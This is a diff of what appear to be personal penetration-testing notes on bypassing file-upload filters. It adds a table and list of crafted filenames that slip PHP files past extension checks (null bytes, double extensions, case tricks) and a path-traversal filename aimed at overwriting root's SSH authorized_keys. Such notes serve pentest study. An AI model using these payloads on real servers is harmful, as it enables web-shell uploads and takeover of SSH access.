@@ -1,9 +1,10 @@
 
 https://book.hacktricks.xyz/pentesting-web/file-upload
-## Windows
 
 #### ASPX or PHP
-PHP files
+Find out if the back-end is running ASPX or PHP, 
+
+There are ASPX and PHP reverse shells.
 #### Bypassing filters
 ###### General extensions
 ```
@@ -18,15 +19,42 @@ Erlang Yaws Web Server: .yaws
 ```
 
 #### Extension filters
-##### Case-checking
-
+###### General filter types
 | Filter | Bypasses |
 | ---- | ---- |
 | Case checking | `.pHp` |
 | First extension checking | `.png.php` |
-|  |  |
-|  |  |
+| Adding a special character | `.php%00`, `.php%0a` |
+| Secondary filetypes | `.php5`, `.php2` |
+###### Small list
+```
+file.php%20
+file.php%0a
+file.php%00
+file.php%0d%0a
+file.php/
+file.php.\
+file.
+file.php....
+file.pHp5....
 
+file.png.php
+file.png.pHp5
+file.php#.png
+file.php%00.png
+file.php\x00.png
+file.php%0a.png
+file.php%0d%0a.png
+file.phpJunk123png
+
+file.png.jpg.php
+file.php%00.png%00.jpg
+
+file.php.png
 ```
 
+### Non-executables
+In `Burp Suite`, change the file to any known user
+```
+filename="../../../../../../../root/.ssh/authorized_keys"
 ```
